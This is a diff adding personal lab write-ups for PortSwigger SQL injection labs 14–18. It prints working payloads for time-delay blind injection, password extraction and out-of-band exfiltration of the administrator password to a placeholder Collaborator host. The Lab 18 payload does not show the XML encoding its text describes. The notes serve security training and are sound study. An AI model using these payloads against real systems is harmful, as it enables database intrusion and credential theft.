@@ -816,3 +816,175 @@ constraint: input length limits (like a cookie size cap) can break an
 otherwise-correct payload, requiring the injection to be restructured (e.g.
 dropping the original tracking value) to fit within the available space.
 
+
+## Lab 14: Blind SQL Injection with Time Delays
+
+Topic: SQL Injection (Blind) | Difficulty: Practitioner
+
+## Vulnerability
+Same class of blind SQL injection as Labs 11–13, but in this case the
+application gives absolutely no visible signal at all — no content
+difference, no error message. The only way to infer information is by
+measuring how long the server takes to respond.
+
+## Technique
+Used a conditional time-delay payload, structured so the database only
+pauses execution (e.g. using a function like `pg_sleep()` in PostgreSQL)
+when an injected condition is true:
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+If the response took approximately 5 seconds longer than normal, the
+condition was true; if it returned immediately, the condition was false.
+
+## What I Learned
+This is the most "blind" form of blind SQLi — with no visible or error-
+based signal at all, response timing becomes the only usable channel.
+This technique is slower and noisier in practice (network latency can
+interfere with timing accuracy) but is essential to know, since some
+real-world applications suppress all other feedback.
+
+
+
+## Lab 15: Blind SQL Injection with Time Delays and Information Retrieval
+
+Topic: SQL Injection (Blind) | Difficulty: Practitioner
+
+## Vulnerability
+Extended the time-delay technique from Lab 14 into full data extraction —
+using conditional time delays to retrieve the administrator's password
+character by character, since no other feedback channel (visible content
+or errors) was available.
+
+## Technique
+Combined the conditional delay trigger with a character-by-character
+comparison, similar in structure to the boolean-based extraction in Lab 11:
+'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
+Used Burp Intruder to automate testing each character at each position,
+measuring response time for each request instead of grep-matching text or
+status codes — a request that took the extra delay indicated a correct
+character guess.
+
+## What I Learned
+This lab combined the timing-based signal from Lab 14 with the same
+systematic character-extraction methodology used in Labs 11–13, confirming
+that regardless of which feedback channel is available (content
+difference, error, or timing), the underlying extraction methodology
+(confirm signal → determine length → brute-force each character position)
+stays consistent. Timing-based extraction is significantly slower in
+practice due to the added delay per request, reinforcing why this
+technique is typically a last resort when no faster signal is available.
+
+
+
+## Lab 16: Blind SQL Injection with Out-of-Band (OAST) Interaction
+
+Topic: SQL Injection (Blind) | Difficulty: Practitioner
+
+## Vulnerability
+This application gave no in-band signal whatsoever — no content
+difference, no errors, and response timing was not reliable either. The
+only way to confirm the injection was working was to trigger the
+database itself to make an external network request to a server under
+my control.
+
+## Technique
+Used Burp Collaborator (PortSwigger's built-in OAST — out-of-band
+application security testing — service) to generate a unique external
+domain, then injected a payload that caused the database to perform a DNS
+lookup against that domain:
+'; SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR-ID.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
+Checking the Burp Collaborator interface afterward showed an incoming DNS
+interaction, confirming the injection triggered a genuine out-of-band
+network call from the database server.
+
+## What I Learned
+Out-of-band techniques are used when literally no other feedback channel
+exists in the response — instead of inferring information from the
+application's behavior, the database is made to "phone home" to an
+external listener that the attacker controls. This is a more advanced,
+specialized technique typically reserved for cases where content-based,
+error-based, and time-based approaches all fail, and it also demonstrates
+why outbound network access from a database server can itself be a
+security risk.
+
+
+
+## Lab 17: Blind SQL Injection with Out-of-Band Data Exfiltration
+
+Topic: SQL Injection (Blind) | Difficulty: Practitioner
+
+## Vulnerability
+Built directly on Lab 16's out-of-band channel, but this time used it to
+actually exfiltrate real data (not just confirm the injection works) — by
+embedding the extracted password value directly into the out-of-band DNS
+request itself.
+
+## Technique
+Modified the out-of-band payload so the subdomain of the outbound request
+included the actual password value, retrieved via a subquery:
+'; SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR-ID.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
+When the database attempted this outbound request, the DNS query itself
+contained the password as part of the subdomain, which was visible
+directly in the Burp Collaborator interaction log.
+
+## What I Learned
+This lab showed how an out-of-band channel isn't limited to just proving
+a vulnerability exists (Lab 16) — it can exfiltrate entire data values in
+a single request, without needing to brute-force character by character
+like the earlier blind techniques. This is significantly more efficient
+than time-based or boolean-based extraction when an out-of-band channel is
+available, since the full value can be captured in one interaction rather
+than dozens or hundreds of requests.
+
+
+
+## Lab 18: SQL Injection with Filter Bypass via XML Encoding
+
+Topic: SQL Injection (Filter Evasion) | Difficulty: Practitioner
+
+## Vulnerability
+This application had a web application firewall (WAF) or input filter
+blocking common SQL injection keywords/characters before they reached the
+database. The underlying injection point was otherwise exploitable, but
+required disguising the payload to slip past the filter.
+
+## Technique
+Encoded the malicious payload using XML entity encoding before submitting
+it, since the filter inspected the raw request but the backend XML parser
+decoded entities before the value reached the SQL query:
+' OR 1=1--
+(where `&#x27;` is the XML-encoded representation of a single quote)
+The filter did not recognize the encoded characters as a SQL
+metacharacter and let the request through, but once the backend's XML
+parser decoded the entity back into a literal `'`, the underlying SQL
+injection executed normally.
+
+## What I Learned
+This lab highlighted a common weakness in filter/WAF-based defenses:
+filtering on raw, literal characters is unreliable when the application
+stack itself performs decoding somewhere downstream (in this case, XML
+entity decoding). An attacker only needs to find one encoding format that
+the filter doesn't recognize but the backend still processes, to
+completely bypass the protection. This reinforces why proper defenses
+rely on parameterized queries rather than input filtering/blacklisting —
+filters can almost always be bypassed through some encoding or obfuscation
+technique.
+
+
+
+## SQL Injection Topic — Final Summary (Labs 1–18)
+Completed 18 hands-on labs on PortSwigger Web Security Academy, covering
+the full practitioner-level breadth of SQL injection as a vulnerability
+class:
+- Basic filter/logic bypass and login bypass (Labs 1–2)
+- UNION-based data extraction across Oracle and non-Oracle databases,
+  including column enumeration and column-limited extraction (Labs 3–10)
+- Blind SQLi: conditional responses, conditional errors, and error-based
+  leakage (Labs 11–13)
+- Blind SQLi: time-based delays, both for detection and full data
+  extraction (Labs 14–15)
+- Blind SQLi: out-of-band interaction and data exfiltration via Burp
+  Collaborator (Labs 16–17)
+- Filter/WAF bypass techniques using encoding (Lab 18)
+
+This represents comprehensive, practitioner-level mastery of SQL injection
+across every major sub-category tested in real-world security assessments.
